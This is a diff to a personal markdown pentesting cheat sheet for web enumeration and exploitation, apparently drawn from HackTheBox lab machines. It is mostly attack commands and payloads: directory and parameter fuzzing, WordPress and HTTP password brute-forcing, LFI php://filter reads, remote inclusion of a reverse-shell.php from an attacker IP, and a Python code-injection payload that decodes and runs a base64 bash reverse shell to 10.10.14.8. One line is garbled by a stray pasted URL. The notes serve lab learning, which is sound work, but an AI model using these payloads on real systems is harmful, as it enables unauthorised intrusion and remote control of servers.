@@ -8,14 +8,21 @@ sudo nmap -p80 --script=http-enum $IP
 
 3. Brute force directories, subdomains, files and apis
 ```bash
+# /opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt
 gobuster dir -u http://loopback:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
-gobuster dns -d http://$ip -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://jeeves.htb:50000/FUZZ/"
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://editorial.htb/FUZZ"
+gobuster dns -d soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
 gobuster dir -u http://$ip -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
 # for api busting
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
 sed -i 's/^/{GOBUSTER}\//' apis
 gobuster dir -u http://$IP:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
 # If you get hits, try to discover more directories using a smaller wordlist
+
+# Once you have the hostname, search for vhost
+feroxbuster -k -u https://streamio.htb -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+[Enter] -> c -f {number of search to cancel}
 ```
 4. Nikto
 ```bash
@@ -23,7 +30,7 @@ nikto --host $ip -ssl -evasion 1
 ```
 5. Manual code inspection
 
-- Look for emails, names, user info, versioning (checking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
+- Look for emails, names, user info, versioning (chhttp://editorial.htb/upload?ecking with searchsploit), examine input box code (checking for hidden form fields), anything interesting, check out robots.txt & sitemap.xml
 - Inspect every fkn inch of the website
 
 99. LFI
@@ -32,7 +39,7 @@ https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion
 
 6. WPscan if it's wordpress
 ```bash
-wpscan --url $URL --enumerate p --plugins-detection aggressive # aggressive plugin detection
+wpscan --url $url --enumerate p --plugins-detection aggressive # aggressive plugin detection
 wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
 wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt # use the usernames that you have from above
 ```
@@ -95,6 +102,27 @@ echo BASE64_ENCODED_STRING | base64 -d
 
 - Refer to (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#16-bits-unicode-encoding) for a whole bunch of awesome payloads, and interesting files to look for on both Windows and Linux. Doesn't include "C:\Windows\System32\drivers\etc\hosts", "C:\inetpub\logs\LogFiles\W3SVC1\\", and "C:\inetpub\wwwroot\web.config"
 
+Try seeing if you can get the php source code:
+
+```bash
+https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
+```
+
+I ran into a page that said "Only accessable through includes". This is referring to a header, "include=", where you can include files and possibly execute code.
+
+WHENEVER YOU'RE SENDING A POST REQUEST, INCLUDE THE CONTEXT-TYPE HEADER, like 'Content-Type: application/x-www-form-urlencoded'.
+
+```bash
+include=echo+WAZZUP%3b
+include=/etc/passwd
+include=http://10.10.14.8:8000/fake
+include=http://10.10.14.8:8000/reverse-shell.php
+include=reverse-shell.php
+```
+When testing for a php reverse shell, you can make a simple php file that says "echo WAZZUP;" and check whether "WAZZUP" is returned in the response.
+
+If that doesn't work, you could have him connect back to us so that we could crack the hash.
+
 14. Stealing Session Cookies
 
 - See if there are any cookies present without the HttpOnly and Secure flags. If this is in the context of WordPress, there's a walkthrough in ../notes/web_assessment_and_xss.md.
@@ -125,7 +153,7 @@ GET /subdir/index.php?page=../../../../../../../../../var/log/apache2/access.log
 Attempt to show the contents of php file:
 
 ```bash
-curl http://example.com/subdir/index.php?page=php://filter/convert-base64-encode/resource=admin.php
+curl http://example.com/subdir/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ```
 
 Attempt to achieve code execution:
@@ -271,10 +299,41 @@ An amazing resource is Cobalt's SSTI page.
 # Copy request from burpsuite to file, search.req
 # Insert FUZZ where you want to fuzz
 ffuf -request search.req -request-proto http -w /opt/SecLists/Fuzzing/special-chars.txt
+# Below for post
+# ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt:FUZZ -fs 61
 # If you wanted to match size of a particular response, you could add '-ms 0'
+# Filtering by lines would be '--fl 34'
 # Check for quick SQL injection, adding url-encoded ';#---, so '%27%3B%23---'
 # Depends on the language being used, if Python, test string concatenation, such as adding "sup')%2B'dawg'"%23. The %23 is to comment out remaining command
 &query=sup')%2Bprint('hi')%23
 &query=sup')%2B__import__('os').system('id')%23
 &query=sup')%2B__import__('os').system('echo%20-n%20YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC84MCAwPiYxICcK%20|base64%20-d|bash')%23
+```
+
+Fuzzing directly in URL, in this case, testing for parameters.
+
+```bash
+ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+```
+
+If you need to be authorized/logged in:
+
+```bash
+ffuf -k -u https://streamio.htb/admin/?FUZZ=id -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=k2285854j74rk51pctgl7kes34'
+```
+
+#### Fuzzing Input Paramater
+
+Find the parameter in Burp to what you want to FUZZ, as well as the Content-Type in Request Headers.
+```
+ffuf -u https://watch.streamio.htb/search.php -d "q=FUZZ" -w /opt/SecLists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded'
+```
+
+Note that it sends the payload non-url-encoded.
+
+#### Hydra for Popups
+
+```bash
+hydra -l user -P pwdpath ip http-get
+# -I to override previous scan with updated list
 ```
